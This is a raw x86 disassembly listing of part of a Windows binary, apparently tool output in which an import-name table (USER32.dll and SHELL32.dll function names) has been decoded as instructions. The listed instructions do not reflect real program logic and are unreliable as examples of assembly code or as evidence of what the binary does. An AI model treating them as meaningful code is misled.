  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
